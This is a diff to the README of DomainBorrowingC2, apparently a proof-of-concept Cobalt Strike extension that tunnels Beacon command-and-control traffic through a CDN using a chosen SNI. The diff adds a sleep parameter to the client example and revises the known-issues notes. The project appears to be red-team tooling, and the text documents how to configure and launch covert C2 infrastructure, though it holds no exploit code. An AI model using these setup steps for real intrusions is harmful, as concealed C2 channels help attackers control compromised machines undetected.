@@ -7,13 +7,14 @@ DomainBorrowingC2 is an extension for Cobalt Strike written in C# using Cobalt S
 ## ClientC2
 The ClientC2 project is responsible for connecting to the CDN and requesting a stager from ServerC2. It manages communications between Beacon and ServerC2.
 
-Configuration for the client happens in `Program.cs`. The client takes 3 parameters:
+Configuration for the client happens in `Program.cs`. The client takes 4 parameters:
 1. domain or ip address to reach the CDN edge server(s)
 2. the SNI
 3. OPTIONAL port to communicate with the CDN, default port is 443
+4. OPTIONAL sleep in milliseconds between messages, default is 60s
 
 ```csharp
-Client client = new Client("target.domain.or.ip.address.here", "target.sni.here", 443);
+Client client = new Client("target.domain.or.ip.address.here", "target.sni.here", 443, 60000);
 ```
 
 ## ServerC2
@@ -32,6 +33,6 @@ public SocketSettings()
 Launch the server with: `sudo dotnet run --url http://127.0.0.1:80/`. You can customize the IP and port to your liking and configure your CDN appropriately.
 
 ## Known issues
-Since this is a PoC and very much WIP, it is currently able to connect to Cobalt Strike, get the stager and execute it which results in an initial beacon callback. It cannot process taskings yet.
 
-ServerC2 currently depends on ClientC2, so make sure to copy the ClientC2 project before running ServerC2.
+* ServerC2 currently depends on ClientC2, so make sure to copy the ClientC2 project before running ServerC2.
+* This PoC will not be enhanced or updated at the moment due to possible IP conflicts, however you're free to submit a pull request and add features or functionality.
